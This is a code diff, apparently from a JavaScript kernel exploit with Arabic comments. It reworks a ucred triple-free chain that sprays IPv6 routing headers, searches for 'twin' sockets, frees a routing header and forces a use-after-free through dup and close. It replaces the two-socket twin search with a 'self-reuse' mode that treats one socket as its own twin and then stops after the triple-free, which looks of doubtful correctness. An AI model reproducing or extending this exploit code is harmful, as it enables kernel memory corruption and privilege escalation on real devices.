@@ -842,63 +842,38 @@ function _find_twins_raw() {
   twins[0] = -1;
   twins[1] = -1;
 
-  var count = 0;
-  var val, i, j;
+  // نختار أول سوكت IPv6 صالح ونستخدمه كـ self-reuse
+  for (var i = 0; i < ipv6_socks.length; i++) {
+    if (ipv6_socks[i].eq(BigInt_Error)) continue;
 
-  while (count < MAX_ROUNDS_TWIN) {
+    // هنا ممكن نعمل write/read بسيطة لو حابب تتأكد
+    var tag = RTHDR_TAG | i;
+    write32(rthdr_spray.add(4), tag);
+    set_rthdr(ipv6_socks[i], rthdr_spray, rthdr_spray_len);
 
-    // WRITE PHASE
-    for (i = 0; i < ipv6_socks.length; i++) {
-      if (ipv6_socks[i].eq(BigInt_Error)) continue;
+    if (get_rthdr(ipv6_socks[i], tag_buf, 8) >= 0) {
+      var val = read32(tag_buf.add(4));
+      log("[SELF-TWINS] sock=" + i +
+          " written_tag=" + hex(tag) +
+          " read_tag=" + hex(val));
 
-      var tag = RTHDR_TAG | i;
-      write32(rthdr_spray.add(4), tag);
-
-      log("[WRITE] sock=" + i + " tag_written=" + hex(tag));
-
-      set_rthdr(ipv6_socks[i], rthdr_spray, rthdr_spray_len);
+      // نعتبره twin لنفسه
+      twins[0] = i;
+      twins[1] = i;
+      return true;
     }
-
-    // READ PHASE
-    for (i = 0; i < ipv6_socks.length; i++) {
-      if (ipv6_socks[i].eq(BigInt_Error)) continue;
-
-      if (get_rthdr(ipv6_socks[i], tag_buf, 8) >= 0) {
-
-        val = read32(tag_buf.add(4));
-        j = val & 0xFFFF;
-
-        log("[READ] sock=" + i + 
-            " val=" + hex(val) + 
-            " j=" + j);
-
-        var condition =
-          ((val & 0xFFFF0000) === RTHDR_TAG) &&
-          (i !== j) &&
-          (j >= 0) &&
-          (j < ipv6_socks.length);
-
-        if (condition) {
-          log("[TWINS] FOUND i=" + i + " j=" + j);
-          twins[0] = i;
-          twins[1] = j;
-          return true;
-        }
-      }
-    }
-
-    count++;
   }
 
   return false;
 }
+
 function find_twins() {
-  log("[TWINS] START");
+  log("[TWINS] START (self-reuse mode)");
 
   var result = _find_twins_raw();
 
   if (result) {
-    log("[TWINS] FOUND → i=" + twins[0] + " j=" + twins[1]);
+    log("[TWINS] SELF twin → i=" + twins[0] + " j=" + twins[1] + " (same)");
   } else {
     log("[TWINS] NOT FOUND");
   }
@@ -1431,53 +1406,45 @@ function trigger_ucred_triplefree() {
     }
     send_notification("step 7: done");
 
-    // 8) إيجاد التوأم
-    log("[TRIGGER] step 8: find_twins()");
+    // 8) إيجاد "توأم" بنمط self-reuse (نفس السوكت)
+    log("[TRIGGER] step 8: find_twins() (self-reuse)");
     end = find_twins();
     send_notification("[TRIGGER] step 8: find_twins() result end=" + end);
 
     if (!end) {
-      send_notification("[TRIGGER] step 8: no twins, cleanup & retry");
+      send_notification("[TRIGGER] step 8: no self socket, cleanup & retry");
       twins[0] = -1;
       twins[1] = -1;
       close(new BigInt(uaf_socket));
       continue;
     }
-    send_notification("step 8: done");
-    log("[TRIGGER] step 8: twins found twins[0]=" + twins[0] + " twins[1]=" + twins[1]);
 
-    // 9) free واحدة من التوأم
-    //log("[TRIGGER] step 9: free_rthdr on twins[1] sock=" + ipv6_socks[twins[1]]);
-    free_rthdr(ipv6_socks[twins[1]]);
-    //log("[TRIGGER] step 9 done");
-    send_notification("step 9: done"); 
-    
-    // 10) انتظار refcount = 1 مع ترتيب ثابت لدورة iov
-    //log("[TRIGGER] step 10: wait refcount==1, max_wait=" + TRIPLEFREE_REFCOUNT_MAX_WAIT);
+    send_notification("step 8: done");
+    log("[TRIGGER] step 8: self twin twins[0]=" + twins[0] + " twins[1]=" + twins[1]);
+
+    // 9) free rthdr على نفس السوكت (self-reuse)
+    free_rthdr(ipv6_socks[twins[0]]);
+    send_notification("step 9: done");
+
+    // 10) انتظار refcount = 1 لنفس السوكت
     var count = 0;
     while (count < TRIPLEFREE_REFCOUNT_MAX_WAIT) {
-     // log("[TRIGGER]   refcount loop count=" + count);
 
-      // شغّل recvmsg
       trigger_iov_recvmsg();
 
-      // كمّل دورة iov بالكامل
       write(new BigInt(iov_sock_1), tmp, 1);
       wait_iov_recvmsg();
       read(new BigInt(iov_sock_0), tmp, 1);
 
-      // دلوقتي بس نقرأ refcount
       write32(leak_rthdr.add(0x04), 0);
       get_rthdr(ipv6_socks[twins[0]], leak_rthdr, 8);
       var refc = read32(leak_rthdr);
-      //log("[TRIGGER]   refcount read=" + refc);
+
       if (refc === 1) break;
       count++;
     }
-    //log("[TRIGGER] step 10: refcount loop end count=" + count);
 
     if (count === TRIPLEFREE_REFCOUNT_MAX_WAIT) {
-      //log("[TRIGGER] step 10: refcount never reached 1, reset & retry");
       twins[0] = -1;
       twins[1] = -1;
       close(new BigInt(uaf_socket));
@@ -1486,15 +1453,17 @@ function trigger_ucred_triplefree() {
     }
 
     triplets[0] = twins[0];
-    //log("[TRIGGER] step 10: refcount==1, triplets[0]=" + triplets[0]);
     send_notification("step 10: done");
 
-
-    // 11) triple free فعليًا
-    //log("[TRIGGER] step 11: triple-free via dup(uaf_socket)");
+    // 11) triple free فعليًا على uaf_socket
     close(dup(new BigInt(uaf_socket)));
-    //log("[TRIGGER] step 11 done");
     send_notification("step 11: done");
+
+    // في وضع self-reuse، نكتفي بالـ triple-free ونوقف هنا
+    log("[TRIGGER] self-reuse triple-free done, triplet[0]=" + triplets[0]);
+
+    end = true;
+    break;
 
     // 12) إيجاد triplet 1
     //log("[TRIGGER] step 12: find_triplet #1 from " + triplets[0]);
